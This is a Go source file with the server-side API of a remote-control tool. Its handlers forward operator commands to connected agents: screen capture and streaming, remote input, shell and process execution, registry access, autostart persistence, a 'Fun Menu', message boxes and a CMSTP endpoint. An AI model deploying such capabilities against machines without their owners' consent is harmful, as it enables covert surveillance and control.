//go:build !agent
// +build !agent

package main

import (
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"time"

	"multifs-advanced/internal/protocol"
)

// Generic error response builder
func agentError(err error, respErr string) string {
	if err != nil {
		return err.Error()
	}
	return respErr
}

// Power API
func (s *server) apiPower(w http.ResponseWriter, r *http.Request) {
	sess, ok := s.requireSession(w, r)
	if !ok || r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	var body struct {
		Action string `json:"action"`
	}
	_ = json.NewDecoder(r.Body).Decode(&body)
	body.Action = strings.TrimSpace(body.Action)
	if body.Action == "" {
		http.Error(w, "missing action", http.StatusBadRequest)
		return
	}

	agentKey := strings.TrimSpace(sess.selectedAgent)
	if agentKey == "" || s.getOnlineConnByKey(agentKey) == nil {
		http.Error(w, "no online agent selected", http.StatusBadRequest)
		return
	}
	req := protocol.Request{
		Type: "req",
		ID:   randID(10),
		Op:   "power",
		Args: map[string]any{"action": body.Action},
	}
	resp, err := s.callAgent(agentKey, req, 25*time.Second)
	if err != nil || !resp.Ok {
		http.Error(w, agentError(err, resp.Err), http.StatusBadRequest)
		return
	}
	writeJSON(w, map[string]any{"ok": true})
}

// Fun Menu API
func (s *server) apiFun(w http.ResponseWriter, r *http.Request) {
	sess, ok := s.requireSession(w, r)
	if !ok || r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	var body struct {
		Action string `json:"action"`
	}
	_ = json.NewDecoder(r.Body).Decode(&body)
	body.Action = strings.TrimSpace(body.Action)
	if body.Action == "" {
		http.Error(w, "missing action", http.StatusBadRequest)
		return
	}

	agentKey := strings.TrimSpace(sess.selectedAgent)
	if agentKey == "" || s.getOnlineConnByKey(agentKey) == nil {
		http.Error(w, "no online agent selected", http.StatusBadRequest)
		return
	}
	req := protocol.Request{
		Type: "req",
		ID:   randID(10),
		Op:   "fun",
		Args: map[string]any{"action": body.Action},
	}
	resp, err := s.callAgent(agentKey, req, 25*time.Second)
	if err != nil || !resp.Ok {
		http.Error(w, agentError(err, resp.Err), http.StatusBadRequest)
		return
	}
	writeJSON(w, map[string]any{"ok": true})
}

// Message Box API
func (s *server) apiMessageBox(w http.ResponseWriter, r *http.Request) {
	sess, ok := s.requireSession(w, r)
	if !ok || r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	var body struct {
		Title   string `json:"title"`
		Message string `json:"message"`
		Type    string `json:"type"`
	}
	_ = json.NewDecoder(r.Body).Decode(&body)

	agentKey := strings.TrimSpace(sess.selectedAgent)
	if agentKey == "" || s.getOnlineConnByKey(agentKey) == nil {
		http.Error(w, "no online agent selected", http.StatusBadRequest)
		return
	}
	req := protocol.Request{
		Type: "req",
		ID:   randID(10),
		Op:   "messagebox",
		Args: map[string]any{
			"title":   body.Title,
			"message": body.Message,
			"type":    body.Type,
		},
	}
	resp, err := s.callAgent(agentKey, req, 25*time.Second)
	if err != nil || !resp.Ok {
		http.Error(w, agentError(err, resp.Err), http.StatusBadRequest)
		return
	}
	writeJSON(w, map[string]any{"ok": true})
}

// Screen Control API
func (s *server) apiScreenCapture(w http.ResponseWriter, r *http.Request) {
	sess, ok := s.requireSession(w, r)
	if !ok || r.Method != http.MethodGet {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	agentKey := strings.TrimSpace(sess.selectedAgent)
	if agentKey == "" || s.getOnlineConnByKey(agentKey) == nil {
		http.Error(w, "no online agent selected", http.StatusBadRequest)
		return
	}
	req := protocol.Request{
		Type: "req",
		ID:   randID(10),
		Op:   "screen_capture",
		Args: map[string]any{"quality": 70},
	}
	resp, err := s.callAgent(agentKey, req, 15*time.Second)
	if err != nil || !resp.Ok {
		http.Error(w, agentError(err, resp.Err), http.StatusBadRequest)
		return
	}

	var result struct {
		Frame string `json:"frame"`
	}
	if err := json.Unmarshal(resp.Result, &result); err != nil {
		http.Error(w, "invalid response", http.StatusInternalServerError)
		return
	}
	writeJSON(w, map[string]any{"frame": result.Frame})
}

func (s *server) apiScreenStream(w http.ResponseWriter, r *http.Request) {
	sess, ok := s.requireSession(w, r)
	if !ok || r.Method != http.MethodGet {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	agentKey := strings.TrimSpace(sess.selectedAgent)
	if agentKey == "" || s.getOnlineConnByKey(agentKey) == nil {
		http.Error(w, "no online agent selected", http.StatusBadRequest)
		return
	}

	quality := r.URL.Query().Get("quality")
	if quality == "" {
		quality = "50"
	}

	req := protocol.Request{
		Type: "req",
		ID:   randID(10),
		Op:   "screen_capture",
		Args: map[string]any{"quality": quality},
	}
	resp, err := s.callAgent(agentKey, req, 8*time.Second)
	if err != nil || !resp.Ok {
		status := http.StatusBadRequest
		if err != nil && strings.Contains(strings.ToLower(err.Error()), "timed out") {
			status = http.StatusGatewayTimeout
		}
		http.Error(w, agentError(err, resp.Err), status)
		return
	}

	var result struct {
		Frame  string `json:"frame"`
		Width  int    `json:"width"`
		Height int    `json:"height"`
	}
	if err := json.Unmarshal(resp.Result, &result); err != nil {
		http.Error(w, "invalid response", http.StatusInternalServerError)
		return
	}
	writeJSON(w, result)
}

// Remote Input API
func (s *server) apiRemoteInput(w http.ResponseWriter, r *http.Request) {
	sess, ok := s.requireSession(w, r)
	if !ok || r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var body struct {
		Type    string `json:"type"`
		X       int    `json:"x,omitempty"`
		Y       int    `json:"y,omitempty"`
		Button  int    `json:"button,omitempty"`
		KeyCode int    `json:"keyCode,omitempty"`
		Key     string `json:"key,omitempty"`
		ScreenW int    `json:"screenW,omitempty"`
		ScreenH int    `json:"screenH,omitempty"`
		Delta   int    `json:"delta,omitempty"`
	}
	_ = json.NewDecoder(r.Body).Decode(&body)

	agentKey := strings.TrimSpace(sess.selectedAgent)
	if agentKey == "" || s.getOnlineConnByKey(agentKey) == nil {
		http.Error(w, "no online agent selected", http.StatusBadRequest)
		return
	}

	req := protocol.Request{
		Type: "req",
		ID:   randID(10),
		Op:   "remote_input",
		Args: map[string]any{
			"type":    body.Type,
			"x":       body.X,
			"y":       body.Y,
			"button":  body.Button,
			"keyCode": body.KeyCode,
			"key":     body.Key,
			"screenW": body.ScreenW,
			"screenH": body.ScreenH,
			"delta":   body.Delta,
		},
	}
	resp, err := s.callAgent(agentKey, req, 2*time.Second)
	if err != nil || !resp.Ok {
		http.Error(w, agentError(err, resp.Err), http.StatusBadRequest)
		return
	}
	writeJSON(w, map[string]any{"ok": true})
}

// Process Manager API
func (s *server) apiProcesses(w http.ResponseWriter, r *http.Request) {
	sess, ok := s.requireSession(w, r)
	if !ok || r.Method != http.MethodGet {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	agentKey := strings.TrimSpace(sess.selectedAgent)
	if agentKey == "" || s.getOnlineConnByKey(agentKey) == nil {
		http.Error(w, "no online agent selected", http.StatusBadRequest)
		return
	}
	req := protocol.Request{
		Type: "req",
		ID:   randID(10),
		Op:   "processes",
	}
	resp, err := s.callAgent(agentKey, req, 15*time.Second)
	if err != nil || !resp.Ok {
		http.Error(w, agentError(err, resp.Err), http.StatusBadRequest)
		return
	}

	var result struct {
		Processes []protocol.ProcessInfo `json:"processes"`
	}
	if err := json.Unmarshal(resp.Result, &result); err != nil {
		http.Error(w, "invalid response", http.StatusInternalServerError)
		return
	}
	writeJSON(w, map[string]any{"processes": result.Processes})
}

func (s *server) apiProcessKill(w http.ResponseWriter, r *http.Request) {
	sess, ok := s.requireSession(w, r)
	if !ok || r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	var body struct {
		PID int32 `json:"pid"`
	}
	_ = json.NewDecoder(r.Body).Decode(&body)

	agentKey := strings.TrimSpace(sess.selectedAgent)
	if agentKey == "" || s.getOnlineConnByKey(agentKey) == nil {
		http.Error(w, "no online agent selected", http.StatusBadRequest)
		return
	}
	req := protocol.Request{
		Type: "req",
		ID:   randID(10),
		Op:   "process_kill",
		Args: map[string]any{"pid": body.PID},
	}
	resp, err := s.callAgent(agentKey, req, 15*time.Second)
	if err != nil || !resp.Ok {
		http.Error(w, agentError(err, resp.Err), http.StatusBadRequest)
		return
	}
	writeJSON(w, map[string]any{"ok": true})
}

func (s *server) apiProcessRun(w http.ResponseWriter, r *http.Request) {
	sess, ok := s.requireSession(w, r)
	if !ok || r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	var body struct {
		Command string `json:"command"`
		Args    string `json:"args"`
	}
	_ = json.NewDecoder(r.Body).Decode(&body)

	agentKey := strings.TrimSpace(sess.selectedAgent)
	if agentKey == "" || s.getOnlineConnByKey(agentKey) == nil {
		http.Error(w, "no online agent selected", http.StatusBadRequest)
		return
	}
	req := protocol.Request{
		Type: "req",
		ID:   randID(10),
		Op:   "process_run",
		Args: map[string]any{
			"command": body.Command,
			"args":    body.Args,
		},
	}
	resp, err := s.callAgent(agentKey, req, 15*time.Second)
	if err != nil || !resp.Ok {
		http.Error(w, agentError(err, resp.Err), http.StatusBadRequest)
		return
	}
	writeJSON(w, map[string]any{"ok": true})
}

// Registry Manager API
func (s *server) apiRegistry(w http.ResponseWriter, r *http.Request) {
	sess, ok := s.requireSession(w, r)
	if !ok || r.Method != http.MethodGet {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	regPath := r.URL.Query().Get("path")
	if regPath == "" {
		regPath = "HKLM"
	}

	agentKey := strings.TrimSpace(sess.selectedAgent)
	if agentKey == "" || s.getOnlineConnByKey(agentKey) == nil {
		http.Error(w, "no online agent selected", http.StatusBadRequest)
		return
	}
	req := protocol.Request{
		Type: "req",
		ID:   randID(10),
		Op:   "registry",
		Args: map[string]any{"path": regPath},
	}
	resp, err := s.callAgent(agentKey, req, 15*time.Second)
	if err != nil || !resp.Ok {
		http.Error(w, agentError(err, resp.Err), http.StatusBadRequest)
		return
	}

	var result protocol.RegistryKey
	if err := json.Unmarshal(resp.Result, &result); err != nil {
		http.Error(w, "invalid response", http.StatusInternalServerError)
		return
	}
	writeJSON(w, result)
}

func (s *server) apiRegistryRead(w http.ResponseWriter, r *http.Request) {
	sess, ok := s.requireSession(w, r)
	if !ok || r.Method != http.MethodGet {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	regPath := r.URL.Query().Get("path")
	valueName := r.URL.Query().Get("value")

	agentKey := strings.TrimSpace(sess.selectedAgent)
	if agentKey == "" || s.getOnlineConnByKey(agentKey) == nil {
		http.Error(w, "no online agent selected", http.StatusBadRequest)
		return
	}
	req := protocol.Request{
		Type: "req",
		ID:   randID(10),
		Op:   "registry_read",
		Args: map[string]any{
			"path":  regPath,
			"value": valueName,
		},
	}
	resp, err := s.callAgent(agentKey, req, 15*time.Second)
	if err != nil || !resp.Ok {
		http.Error(w, agentError(err, resp.Err), http.StatusBadRequest)
		return
	}
	writeJSON(w, resp.Result)
}

// Shell API
func (s *server) apiShell(w http.ResponseWriter, r *http.Request) {
	sess, ok := s.requireSession(w, r)
	if !ok || r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	var body struct {
		Command string `json:"command"`
	}
	_ = json.NewDecoder(r.Body).Decode(&body)

	agentKey := strings.TrimSpace(sess.selectedAgent)
	if agentKey == "" || s.getOnlineConnByKey(agentKey) == nil {
		http.Error(w, "no online agent selected", http.StatusBadRequest)
		return
	}
	req := protocol.Request{
		Type: "req",
		ID:   randID(10),
		Op:   "shell",
		Args: map[string]any{"command": body.Command},
	}
	resp, err := s.callAgent(agentKey, req, 60*time.Second)
	if err != nil || !resp.Ok {
		http.Error(w, agentError(err, resp.Err), http.StatusBadRequest)
		return
	}

	var result struct {
		Output string `json:"output"`
		Error  string `json:"error"`
	}
	if err := json.Unmarshal(resp.Result, &result); err != nil {
		http.Error(w, "invalid response", http.StatusInternalServerError)
		return
	}
	writeJSON(w, result)
}

// Startup API
func (s *server) apiStartup(w http.ResponseWriter, r *http.Request) {
	sess, ok := s.requireSession(w, r)
	if !ok || r.Method != http.MethodGet {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	agentKey := strings.TrimSpace(sess.selectedAgent)
	if agentKey == "" || s.getOnlineConnByKey(agentKey) == nil {
		http.Error(w, "no online agent selected", http.StatusBadRequest)
		return
	}
	req := protocol.Request{
		Type: "req",
		ID:   randID(10),
		Op:   "startup",
	}
	resp, err := s.callAgent(agentKey, req, 15*time.Second)
	if err != nil || !resp.Ok {
		http.Error(w, agentError(err, resp.Err), http.StatusBadRequest)
		return
	}

	var result struct {
		Items []protocol.StartupEntry `json:"items"`
	}
	if err := json.Unmarshal(resp.Result, &result); err != nil {
		http.Error(w, "invalid response", http.StatusInternalServerError)
		return
	}
	writeJSON(w, map[string]any{"items": result.Items})
}

func (s *server) apiStartupRemove(w http.ResponseWriter, r *http.Request) {
	sess, ok := s.requireSession(w, r)
	if !ok || r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	var body struct {
		Name string `json:"name"`
	}
	_ = json.NewDecoder(r.Body).Decode(&body)

	agentKey := strings.TrimSpace(sess.selectedAgent)
	if agentKey == "" || s.getOnlineConnByKey(agentKey) == nil {
		http.Error(w, "no online agent selected", http.StatusBadRequest)
		return
	}
	req := protocol.Request{
		Type: "req",
		ID:   randID(10),
		Op:   "startup_remove",
		Args: map[string]any{"name": body.Name},
	}
	resp, err := s.callAgent(agentKey, req, 15*time.Second)
	if err != nil || !resp.Ok {
		http.Error(w, agentError(err, resp.Err), http.StatusBadRequest)
		return
	}
	writeJSON(w, map[string]any{"ok": true})
}

// CMSTP API
func (s *server) apiCmstp(w http.ResponseWriter, r *http.Request) {
	sess, ok := s.requireSession(w, r)
	if !ok || r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	var body struct {
		Action string `json:"action"`
	}
	_ = json.NewDecoder(r.Body).Decode(&body)

	agentKey := strings.TrimSpace(sess.selectedAgent)
	if agentKey == "" || s.getOnlineConnByKey(agentKey) == nil {
		http.Error(w, "no online agent selected", http.StatusBadRequest)
		return
	}
	req := protocol.Request{
		Type: "req",
		ID:   randID(10),
		Op:   "cmstp",
		Args: map[string]any{"action": body.Action},
	}
	resp, err := s.callAgent(agentKey, req, 30*time.Second)
	if err != nil || !resp.Ok {
		http.Error(w, agentError(err, resp.Err), http.StatusBadRequest)
		return
	}
	writeJSON(w, map[string]any{"ok": true})
}

// Logs API
func (s *server) apiLogs(w http.ResponseWriter, r *http.Request) {
	sess, ok := s.requireSession(w, r)
	if !ok || r.Method != http.MethodGet {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	source := r.URL.Query().Get("source")
	level := r.URL.Query().Get("level")
	if source == "" {
		source = "system"
	}

	agentKey := strings.TrimSpace(sess.selectedAgent)
	if agentKey == "" || s.getOnlineConnByKey(agentKey) == nil {
		http.Error(w, "no online agent selected", http.StatusBadRequest)
		return
	}
	req := protocol.Request{
		Type: "req",
		ID:   randID(10),
		Op:   "logs",
		Args: map[string]any{
			"source": source,
			"level":  level,
		},
	}
	resp, err := s.callAgent(agentKey, req, 20*time.Second)
	if err != nil || !resp.Ok {
		http.Error(w, agentError(err, resp.Err), http.StatusBadRequest)
		return
	}

	var result struct {
		Logs []protocol.LogEntry `json:"logs"`
	}
	if err := json.Unmarshal(resp.Result, &result); err != nil {
		http.Error(w, "invalid response", http.StatusInternalServerError)
		return
	}
	writeJSON(w, map[string]any{"logs": result.Logs})
}

// Agent Control API
func (s *server) apiAgentControl(w http.ResponseWriter, r *http.Request) {
	sess, ok := s.requireSession(w, r)
	if !ok || r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	path := strings.TrimPrefix(r.URL.Path, "/api/agent/")
	action := strings.TrimSpace(path)

	agentKey := strings.TrimSpace(sess.selectedAgent)
	if agentKey == "" || s.getOnlineConnByKey(agentKey) == nil {
		http.Error(w, "no online agent selected", http.StatusBadRequest)
		return
	}

	op := "agent_" + action
	req := protocol.Request{
		Type: "req",
		ID:   randID(10),
		Op:   op,
	}
	resp, err := s.callAgent(agentKey, req, 15*time.Second)
	if err != nil || !resp.Ok {
		http.Error(w, agentError(err, resp.Err), http.StatusBadRequest)
		return
	}
	writeJSON(w, map[string]any{"ok": true})
}

// Agent Uninstall API
func (s *server) apiAgentUninstall(w http.ResponseWriter, r *http.Request) {
	sess, ok := s.requireSession(w, r)
	if !ok || r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	agentKey := strings.TrimSpace(sess.selectedAgent)
	if agentKey == "" {
		http.Error(w, "no system selected", http.StatusBadRequest)
		return
	}
	if s.getOnlineConnByKey(agentKey) == nil {
		http.Error(w, "system offline", http.StatusBadRequest)
		return
	}

	req := protocol.Request{
		Type: "req",
		ID:   randID(10),
		Op:   "agent_uninstall",
	}
	resp, err := s.callAgent(agentKey, req, 8*time.Second)
	if err != nil || !resp.Ok {
		http.Error(w, agentError(err, resp.Err), http.StatusBadRequest)
		return
	}
	writeJSON(w, map[string]any{"ok": true})
}

// Startup Control API: installs or removes the agent's autostart entry
// (HKCU Run\MultiFS Agent) on the currently-selected agent. Gated by the
// "agent_control" capability and never touches binaries.
func (s *server) apiAgentStartup(w http.ResponseWriter, r *http.Request) {
	sess, ok := s.requireSession(w, r)
	if !ok || r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	path := strings.TrimPrefix(r.URL.Path, "/api/agent/startup/")
	action := strings.TrimSpace(path)

	var op string
	switch action {
	case "install":
		op = "agent_startup_install"
	case "uninstall":
		op = "agent_startup_uninstall"
	case "status":
		op = "agent_startup_status"
	default:
		http.Error(w, "unknown startup action", http.StatusBadRequest)
		return
	}

	agentKey := strings.TrimSpace(sess.selectedAgent)
	if agentKey == "" {
		http.Error(w, "no system selected", http.StatusBadRequest)
		return
	}
	if s.getOnlineConnByKey(agentKey) == nil {
		http.Error(w, "system offline", http.StatusBadRequest)
		return
	}

	req := protocol.Request{Type: "req", ID: randID(10), Op: op}
	resp, err := s.callAgent(agentKey, req, 10*time.Second)
	if err != nil || !resp.Ok {
		http.Error(w, agentError(err, resp.Err), http.StatusBadRequest)
		return
	}

	out := map[string]any{"ok": true, "action": action}
	if len(resp.Result) > 0 {
		var raw map[string]any
		if err := json.Unmarshal(resp.Result, &raw); err == nil {
			for k, v := range raw {
				out[k] = v
			}
		}
	}
	writeJSON(w, out)
}

func contentDispositionAttachment(filename string) string {
	filename = safeFilename(strings.TrimSuffix(filename, ".zip")) + ".zip"
	return fmt.Sprintf("attachment; filename=\"%s\"; filename*=UTF-8''%s", filename, url.QueryEscape(filename))
}

func safeFilename(s string) string {
	s = strings.TrimSpace(s)
	if s == "" {
		return "system"
	}
	repl := func(r rune) rune {
		switch r {
		case '/', '\\', ':', '*', '?', '"', '<', '>', '|':
			return '-'
		default:
			return r
		}
	}
	out := strings.Map(repl, s)
	if len(out) > 64 {
		out = out[:64]
	}
	return out
}

// Drives API
func (s *server) apiDrives(w http.ResponseWriter, r *http.Request) {
	se, ok := s.requireSession(w, r)
	if !ok {
		return
	}
	agentID, ac := s.selectedAgentFor(se)
	if ac == nil {
		writeJSON(w, map[string]any{"drives": []any{}})
		return
	}
	drs, err := s.drivesFor(agentID)
	if err != nil {
		writeJSON(w, map[string]any{"drives": []any{}})
		return
	}
	out := make([]map[string]any, 0, len(drs))
	for _, d := range drs {
		out = append(out, map[string]any{"label": d.Label, "path": d.Path})
	}
	writeJSON(w, map[string]any{"drives": out})
}

func (s *server) selectedAgentFor(se *session) (string, *agentConn) {
	key := se.selectedAgent
	if key == "" {
		key = s.firstAgentID()
		if key != "" {
			se.selectedAgent = key
		}
	}
	return key, s.getOnlineConnByKey(key)
}

func (s *server) drivesFor(agentID string) ([]drive, error) {
	resp, err := s.callAgent(agentID, protocol.Request{Op: "drives"}, 12*time.Second)
	if err != nil {
		return nil, err
	}
	if !resp.Ok {
		return nil, fmt.Errorf("agent error: %s", resp.Err)
	}
	var dr protocol.DrivesResult
	if err := json.Unmarshal(resp.Result, &dr); err != nil {
		return nil, err
	}
	out := make([]drive, 0, len(dr.Drives))
	for _, d := range dr.Drives {
		out = append(out, drive{Label: d.Label, Path: d.Path})
	}
	return out, nil
}
